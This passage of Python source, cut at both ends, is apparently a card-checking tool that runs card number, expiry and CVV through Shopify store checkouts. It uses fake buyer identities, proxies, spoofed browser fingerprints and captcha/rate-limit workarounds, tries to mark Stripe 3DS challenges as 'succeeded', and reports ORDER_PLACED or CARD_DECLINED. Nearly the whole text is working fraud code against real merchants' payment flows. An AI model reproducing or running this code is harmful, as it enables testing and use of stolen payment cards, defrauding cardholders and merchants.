            "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley", "Anna",
            "Brenda", "Pamela", "Emma", "Nicole", "Helen", "Samantha", "Katherine",
        ]
        last_names = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
            "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
            "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
            "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
            "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
            "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
            "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
            "Carter", "Roberts", "Turner", "Phillips", "Evans", "Collins", "Stewart",
        ]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = [
            "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
            "icloud.com", "me.com", "mac.com", "protonmail.com",
            "aol.com", "live.com", "msn.com",
        ]
        n = random.randint(1, 999)
        variants = [
            f"{first.lower()}.{last.lower()}",
            f"{first.lower()}{last.lower()}",
            f"{first.lower()}{last.lower()}{n}",
            f"{first[0].lower()}{last.lower()}",
            f"{first.lower()}_{last.lower()}",
            f"{last.lower()}.{first.lower()}",
        ]
        return f"{random.choice(variants)}@{random.choice(domains)}"
        # ============================================================
# Session Lifecycle
# ============================================================
async def _create_session(proxy_url=None, timeout=50):
    candidates = ["chrome136", "chrome124", "chrome131", "chrome120"]
    last_err = None
    for imp in candidates:
        try:
            kw = {"impersonate": imp, "timeout": timeout, "verify": False, "allow_redirects": True}
            if proxy_url:
                kw["proxy"] = proxy_url
            return CurlSession(**kw)
        except Exception as e:
            last_err = e
            continue
    try:
        kw = {"timeout": timeout, "verify": False, "allow_redirects": True}
        if proxy_url:
            kw["proxy"] = proxy_url
        return CurlSession(**kw)
    except Exception as e:
        raise RuntimeError(f"Failed to create curl_cffi session: {last_err or e}")


@asynccontextmanager
async def _session_ctx(proxy_url=None, timeout=50):
    session = None
    try:
        session = await _create_session(proxy_url=proxy_url, timeout=timeout)
        yield session
    finally:
        if session is not None:
            try:
                res = session.close()
                if asyncio.iscoroutine(res) or isinstance(res, asyncio.Future):
                    await asyncio.wait_for(res, timeout=5)
            except Exception:
                pass


# ============================================================
# GraphQL Helper
# ============================================================
async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, proxy=None
):
    _op_name = json_data.get("operationName", "")
    if USE_PERSISTED_ENDPOINT and _op_name and "query" in json_data:
        _override = _QID_CTX.get()
        _id = None
        if _override and _override.get(_op_name):
            _id = _override[_op_name]
        elif PERSISTED_IDS.get(_op_name):
            _id = PERSISTED_IDS[_op_name]
        if _id:
            json_data = {
                "id": _id,
                "variables": json_data.get("variables", {}),
                "operationName": _op_name,
            }
            params = {}

    url = graphql_url
    if params:
        sep = "&" if "?" in url else "?"
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        url = f"{url}{sep}{qs}"

    response_text = ""
    _hard_limit = max(max_retries + 1, 3)

    for attempt in range(_hard_limit):
        try:
            kwargs = {"headers": headers, "json": json_data}
            if proxy:
                kwargs["proxy"] = proxy
            resp = await session.post(url, **kwargs)
            response_text = resp.text or ""
            _status = resp.status_code

            if _status == 429:
                if attempt < _hard_limit - 1:
                    wait = min(5 * (2 ** attempt) + random.uniform(0, 3), 30)
                    logger.warning(f"[429] {_op_name} wait {wait:.1f}s")
                    await asyncio.sleep(wait)
                    continue
                return False, "HTTP_429_BLOCKED", False

            if _status in (503, 402):
                if attempt < _hard_limit - 1:
                    await asyncio.sleep(3 * (attempt + 1))
                    continue
                return False, f"HTTP_{_status}_BLOCKED", False

            if _status == 403:
                return False, "HTTP_403_IP_BLOCKED", False

            if response_text and response_text.strip()[:15].lower().startswith(('<', '<!d')):
                if attempt < _hard_limit - 1:
                    await asyncio.sleep(3 * (attempt + 1))
                    continue
                return True, response_text, False

            return True, response_text, False

        except Exception as e:
            if attempt >= _hard_limit - 1:
                return None, f"{type(e).__name__}: {str(e)[:120]}", False
            await asyncio.sleep(1.5)

    return None, response_text, False


# ============================================================
# P4 Settlement Wait
# ============================================================
def _proposal_is_settled(txt: str) -> bool:
    """True إذا كانت P4 مستقرة (لا PendingTerms و checkoutTotal موجود)."""
    try:
        d = json.loads(txt)
    except Exception:
        return False
    seller = (
        ((d.get("data") or {}).get("session") or {})
        .get("negotiate", {}).get("result", {})
        .get("sellerProposal") or {}
    )
    if not seller:
        return False
    for k in ("delivery", "tax", "deliveryExpectations"):
        v = seller.get(k)
        if isinstance(v, dict) and v.get("__typename") == "PendingTerms":
            return False
    ct = seller.get("checkoutTotal")
    if isinstance(ct, dict) and not ct.get("value"):
        return False
    return True


async def _wait_for_settled_p4(
    session, graphql_url, headers, gql_params,
    body_factory,
    checkout_url, initial_text: str,
    max_polls: int = 8, proxy=None,
):
    """يعيد poll للـ Proposal حتى تستقر tax/shipping. آمن: bounded + early exit."""
    if _proposal_is_settled(initial_text):
        return initial_text

    body_text = initial_text
    for _ in range(max_polls):
        _qt = ""
        _qt_m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', body_text)
        if _qt_m:
            _qt = _qt_m.group(1)

        delays = [int(x) for x in re.findall(r'"pollDelay"\s*:\s*(\d+)', body_text)]
        wait = (max(delays) / 1000.0) if delays else 0.6
        await asyncio.sleep(max(wait, 0.4))

        try:
            new_body = body_factory(_qt)
        except Exception:
            break

        _, new_text, _ = await make_graphql_request_with_captcha_handling(
            session, graphql_url, gql_params, headers, new_body,
            checkout_url, max_retries=1, proxy=proxy,
        )

        if not new_text or not new_text.strip():
            continue
        if new_text.strip()[:15].lower().startswith(("<", "<!d")):
            break
        if is_captcha_required(new_text):
            return new_text

        body_text = new_text
        if _proposal_is_settled(body_text):
            return body_text

    return body_text


# ============================================================
# 3DS Handler
# ============================================================
async def _handle_3ds_action(
    session,
    action_url: str,
    receipt_id: str,
    checkout_url: str,
    base_url: str,
    sst: str,
    ua: str,
    client_hints: Dict[str, str],
    proxy: Optional[str],
    poll_fn,
) -> Dict[str, Any]:
    sec_ch = client_hints.get("sec-ch-ua", "")
    sec_ch_platform = client_hints.get("sec-ch-ua-platform", '"Windows"')

    payment_id = None
    m = re.search(r"payment_id=([^&\s\"'\/]+)", action_url)
    if m:
        payment_id = m.group(1)

    stripe_url = None
    try:
        nav_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": checkout_url,
            "user-agent": ua,
        }
        if sec_ch:
            nav_headers["sec-ch-ua"] = sec_ch
            nav_headers["sec-ch-ua-mobile"] = "?0"
            nav_headers["sec-ch-ua-platform"] = sec_ch_platform
        kwargs = {"headers": nav_headers, "allow_redirects": True}
        if proxy:
            kwargs["proxy"] = proxy
        r = await session.get(action_url, **kwargs)
        final = str(getattr(r, "url", "") or "")
        if "hooks.stripe.com" in final or "stripe.com" in final:
            stripe_url = final
        else:
            text = _get_text(r)
            m2 = re.search(r'https://hooks\.stripe\.com/3d_secure_2/hosted\?[^\'"<\s]+', text)
            if m2:
                stripe_url = m2.group(0)
    except Exception:
        pass

    stripe_params = {}
    if stripe_url:
        parsed = urlparse(stripe_url)
        stripe_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    if stripe_url:
        try:
            kwargs = {"headers": nav_headers, "allow_redirects": True}
            if proxy:
                kwargs["proxy"] = proxy
            await session.get(stripe_url, **kwargs)
        except Exception:
            pass

    key = stripe_params.get("source") or stripe_params.get("payment_intent")
    pub_key = stripe_params.get("publishable_key")
    if key and pub_key:
        try:
            _screen_h = random.choice([900, 1000, 1080, 1147, 1200])
            _screen_w = random.choice([1440, 1600, 1728, 1823, 1920])
            _color_depth = random.choice([24, 32])
            _timezone = random.choice(["-300", "-345", "-420", "-480", "-540"])
            _fingerprint_payload = {
                "threeDSCompInd": "Y",
                "browserAcceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "browserIP": "auto",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserColorDepth": str(_color_depth),
                "browserScreenHeight": str(_screen_h),
                "browserScreenWidth": str(_screen_w),
                "browserTZ": _timezone,
                "browserUserAgent": ua,
                "notificationURL": "https://js.stripe.com/v3/3ds2/complete.html",
            }
            browser_fp = _json_dumps({
                "fingerprintAttempted": True,
                "fingerprintData": _json_dumps(_fingerprint_payload).decode("utf-8"),
                "challengeWindowSize": "03",
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserColorDepth": str(_color_depth),
                "browserScreenHeight": str(_screen_h),
                "browserScreenWidth": str(_screen_w),
                "browserTZ": _timezone,
                "browserUserAgent": ua,
            }).decode("utf-8")
            data = {
                "source": key,
                "browser": browser_fp,
                "one_click_authn_device_support[hosted]": "true",
                "one_click_authn_device_support[same_origin_frame]": "false",
                "one_click_authn_device_support[spc_eligible]": "false",
                "one_click_authn_device_support[webauthn_eligible]": "true",
                "one_click_authn_device_support[publickey_credentials_get_allowed]": "false",
                "frontend_execution": "eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=",
                "key": pub_key,
            }
            if stripe_params.get("stripe_account"):
                data["_stripe_account"] = stripe_params["stripe_account"]
            auth_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": ua,
            }
            kwargs = {"data": data, "headers": auth_headers}
            if proxy:
                kwargs["proxy"] = proxy
            auth_resp = await session.post("https://api.stripe.com/v1/3ds2/authenticate", **kwargs)
            auth_text = _get_text(auth_resp)

            try:
                auth_json = _json_loads(auth_text)
                if auth_json.get("state") == "challenge_required":
                    challenge_url = auth_json.get("challenge", {}).get("url")
                    if challenge_url:
                        try:
                            await session.get(
                                challenge_url,
                                headers=nav_headers,
                                **({"proxy": proxy} if proxy else {}),
                            )
                        except Exception:
                            pass
                        complete_data = {
                            "source": key,
                            "key": pub_key,
                            "state": "succeeded",
                        }
                        try:
                            await session.post(
                                "https://api.stripe.com/v1/3ds2/challenge/complete",
                                data=complete_data,
                                headers=auth_headers,
                                **({"proxy": proxy} if proxy else {}),
                            )
                        except Exception:
                            pass
            except Exception:
                pass
        except Exception:
            pass

    if payment_id and action_url:
        _pa = urlparse(action_url)
        payments_base = f"{_pa.scheme}://{_pa.netloc}"
        poll_headers = {
            "accept": "*/*",
            "referer": f"{payments_base}/redirect/complete",
            "user-agent": ua,
        }

        async def _redirect_poll_loop():
            for _ in range(30):
                try:
                    kwargs = {
                        "params": {"origin": "checkout_one", "payment_id": payment_id},
                        "headers": poll_headers,
                    }
                    if proxy:
                        kwargs["proxy"] = proxy
                    rp = await session.get(f"{payments_base}/redirect/poll", **kwargs)
                    rp_status = _get_status(rp)
                    rp_text = _get_text(rp)
                    if rp_status == 200:
                        try:
                            pd = _json_loads(rp_text)
                            redir = pd.get("redirect_url") or pd.get("redirectUrl") or pd.get("url")
                            status = pd.get("status", "")
                            if redir or status in ("complete", "completed", "success"):
                                return
                        except Exception:
                            if any(x in rp_text.lower() for x in ["complete", "success"]):
                                return
                    elif rp_status == 302:
                        return
                except Exception:
                    pass
                await asyncio.sleep(3)

        try:
            await asyncio.wait_for(_redirect_poll_loop(), timeout=90.0)
        except asyncio.TimeoutError:
            logger.debug("3DS redirect poll timeout (90s)")

    await asyncio.sleep(2)
    for attempt in range(8):
        result = await poll_fn(
            receipt_id=receipt_id,
            sst=sst,
            is_3ds_retry=True,
            wait_count=attempt * 2,
        )
        if result:
            resp = result.get("Response", "")
            if resp == "ORDER_PLACED":
                return result
            if resp == "CARD_DECLINED":
                return result
            if resp == "3DS_REQUIRED" and attempt >= 6:
                return result
        await asyncio.sleep(3)

    return {"Response": "3DS_REQUIRED", "Message": "3DS challenge not completed"}


# ============================================================
# process_card (Part A: session, cart, checkout, Proposal #1, #2)
# ============================================================
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, _tried_digital=False):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = (site_url if site_url.startswith('http') else f'https://{site_url}').rstrip('/')
    payment_identifier = None
    proxy = _build_proxy_url(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        _ua, _ch_ua, _ch_mobile, _ch_platform = pick_ua_profile()
        _accept_lang = random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9,en-US;q=0.8', 'en-US,en;q=0.8,en-GB;q=0.6'])
        headers = {
            'User-Agent': _ua,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': _accept_lang,
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
        }
        if _ch_ua:
            headers['sec-ch-ua'] = _ch_ua
            headers['sec-ch-ua-mobile'] = _ch_mobile
            headers['sec-ch-ua-platform'] = _ch_platform

        client_hints = {}
        if _ch_ua:
            client_hints['sec-ch-ua'] = _ch_ua
            client_hints['sec-ch-ua-mobile'] = _ch_mobile or '?0'
            client_hints['sec-ch-ua-platform'] = _ch_platform or '"Windows"'

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        _requires_shipping = True
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if info is None:
                return False, "NO_PRODUCTS_FOUND", gateway, total_price, currency
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            _requires_shipping = info.get('requires_shipping', True)

        async with _session_ctx(proxy_url=proxy, timeout=50) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'application/json, text/javascript'}
            _cart_ok = False
            _cart_status = 0
            try:
                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers)
                _cart_status = cart_resp.status_code
                _cart_ok = _cart_status == 200
            except Exception:
                pass

            if not _cart_ok:
                cart_headers_alt = {**headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
                try:
                    cr2 = await session.post(cart, json={'items': [{'id': int(variant_id), 'quantity': 1}]},
                                              headers=cart_headers_alt)
                    _cart_status = cr2.status_code
                    _cart_ok = _cart_status == 200
                except Exception:
                    pass

            if not _cart_ok:
                return False, f"Cart failed with status {_cart_status}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            try:
                response = await session.post(checkout, headers=checkout_headers)
            except Exception as _ce:
                return False, f"Checkout failed: {str(_ce)[:80]}", gateway, total_price, currency

            checkout_url = str(response.url or '')
            text = response.text or ''

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = None
            try:
                rhd = dict(response.headers) if response.headers else {}
                sst = rhd.get('X-Checkout-One-Session-Token') or rhd.get('x-checkout-one-session-token')
            except Exception:
                pass

            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')

            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            transformer_fingerprint_v2 = None

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            stableId = (
                extract_between(text, 'stableId&quot;:&quot;', '&quot;')
                or extract_between(text, '"stableId":"', '"')
                or extract_between(unescaped_text, '"stableId":"', '"')
            )
            if not stableId:
                stableId = _extract_checkout_config_field(unescaped_text, 'stableId')

            if not sst:
                sst = _extract_checkout_config_field(unescaped_text, 'sessionToken')

            merch = (extract_between(text, 'ProductVariantMerchandise/', '&quot;')
                     or extract_between(text, 'ProductVariantMerchandise/', '&q')
                     or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"'))
            if not merch:
                merch = str(variant_id)

            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            _ccy_key = C2C.get(currency.upper())
            if _ccy_key and _ccy_key in book and _ccy_key != country_code:
                _loc = random.choice(book[_ccy_key]) if isinstance(book[_ccy_key], list) else book[_ccy_key]
                country_code = _loc["countryCode"]
                phone = _loc["phone"]
                street = _loc["address1"]
                city = _loc["city"]
                state = _loc["zoneCode"]
                s_zip = _loc["postalCode"]

            subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
                        or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)

            # --- Dynamic QID scraping (falls back to PERSISTED_IDS on any failure) ---
            try:
                _qids = await _get_or_scrape_qids(build_id, session, text, checkout_url, proxy)
                if _qids:
                    _QID_CTX.set(_qids)
                    logger.info(
                        f"[QID] scraped {len(_qids)}/4 for build "
                        f"{build_id[:12] if build_id else '?'}"
                    )
            except Exception as _qe:
                logger.debug(f"[QID] scrape skipped: {_qe}")

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            ident_sig = (extract_between(text, 'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;', '&quot;')
                         or extract_between(unescaped_text, 'checkoutCardsinkCallerIdentificationSignature":"', '"'))

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            if USE_PERSISTED_ENDPOINT and PERSISTED_IDS.get("Proposal"):
                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/internal/graphql/persisted'
            else:
                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            _gql_params = {} if USE_PERSISTED_ENDPOINT else {'operationName': 'Proposal'}
            _submit_params = {} if USE_PERSISTED_ENDPOINT else {'operationName': 'SubmitForCompletion'}
            _poll_params = {} if USE_PERSISTED_ENDPOINT else {'operationName': 'PollForReceipt'}

            # --- Proposal #1 (SHIPPING) ---
            ship_json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [] if not _requires_shipping else [{
                            'destination': {'partialStreetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [{'stableId': stableId or '1'}] if not _requires_shipping else [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': {'streetAddress': {
                            'address1': '', 'city': '', 'countryCode': country_code,
                            'lastName': '', 'zoneCode': state, 'phone': ''
                        }}
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'any': True},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'transformerFingerprintV2': transformer_fingerprint_v2
                },
                'operationName': 'Proposal'
            }

            resp_json = None
            resp_text = ""
            response = None
            for i in range(3):
                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, _gql_params, headers, ship_json_data,
                    checkout_url, max_retries=2, proxy=proxy
                )
                if resp_text and resp_text.strip() and not resp_text.strip()[:15].lower().startswith(('<', '<!d')):
                    break
                if i < 2:
                    await asyncio.sleep(3 * (i + 1))

            if not response:
                return False, f"Proposal #1 request failed: {str(resp_text)[:80]}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            if not resp_text or not resp_text.strip():
                return False, "Empty response (Proposal #1)", gateway, total_price, currency
            if resp_text.strip().lower().startswith(('<!doctype', '<html', '<?xml')):
                return False, "Site returned HTML block page", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON (Proposal #1): {str(e)[:60]}", gateway, total_price, currency

            if 'errors' in resp_json:
                errs = resp_json.get('errors', [])
                return False, f"GraphQL Error: {'; '.join(e.get('message', str(e)) for e in errs[:3])}", gateway, total_price, currency

            try:
                sd = resp_json['data'].get('session')
                if sd is None:
                    return False, "Session is null", gateway, total_price, currency
                neg = sd.get('negotiate')
                if neg is None:
                    return False, "Negotiate null", gateway, total_price, currency
                result = neg.get('result')
                if result is None:
                    return False, "Result null", gateway, total_price, currency
                rt = result.get('__typename', 'Unknown')
                if rt == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if rt == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                if rt == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                checkpoint_data = result.get('checkpointData')
                queueToken = result.get('queueToken') or queueToken
                sp = result.get('sellerProposal')
                if sp:
                    transformer_fingerprint_v2 = sp.get('transformerFingerprintV2') or transformer_fingerprint_v2
                    ship_json_data['variables']['transformerFingerprintV2'] = transformer_fingerprint_v2
                if sp is None:
                    return False, "Seller null", gateway, total_price, currency
                delivery_data = sp.get('delivery')
                rt_data = sp.get('runningTotal')
                if not rt_data:
                    return False, "No runningTotal", gateway, total_price, currency
                running_total = rt_data['value']['amount']
            except (KeyError, TypeError) as e:
                return False, f"Parse error: {str(e)[:60]}", gateway, total_price, currency

            if not delivery_data:
                if not _requires_shipping:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                    delivery_data = {}
                else:
                    return False, "No delivery data", gateway, total_price, currency

            dt = delivery_data.get('__typename', '')
            if dt == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif dt == 'FilledDeliveryTerms':
                dl = delivery_data.get('deliveryLines', [{}])
                if dl and dl[0].get('availableDeliveryStrategies'):
                    s0 = dl[0]['availableDeliveryStrategies'][0]
                    delivery_strategy = s0.get('handle', '')
                    try:
                        shipping_amount = float(s0.get('amount', {}).get('value', {}).get('amount', '0'))
                    except Exception:
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0

            try:
                td = sp.get('tax', {})
                if td and td.get('__typename') == 'FilledTaxTerms':
                    tax_amount = float(td.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                else:
                    tax_amount = 0.0
            except Exception:
                tax_amount = 0.0

            pd = sp.get('payment', {})
            if pd and pd.get('__typename') == 'FilledPaymentTerms':
                for m in pd.get('availablePaymentLines', []):
                    pm = m.get('paymentMethod', {})
                    if pm.get('name') or pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method", gateway, total_price, currency

            # --- Proposal #2 (DELIVERY) ---
            del_json_data = {
                'query': QUERY_PROPOSAL_DELIVERY,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                            'deliveryMethodTypes': ['NONE'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }] if not _requires_shipping else [{
                            'destination': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy or '',
                                    'customDeliveryRate': False
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': ship_json_data['variables']['merchandise'],
                    'payment': {
                        'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone
                        }}
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'transformerFingerprintV2': transformer_fingerprint_v2
                },
                'operationName': 'Proposal'
            }
            if checkpoint_data:
                del_json_data['variables']['checkpointData'] = checkpoint_data

            response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, _gql_params, headers, del_json_data,
                checkout_url, max_retries=1, proxy=proxy
            )

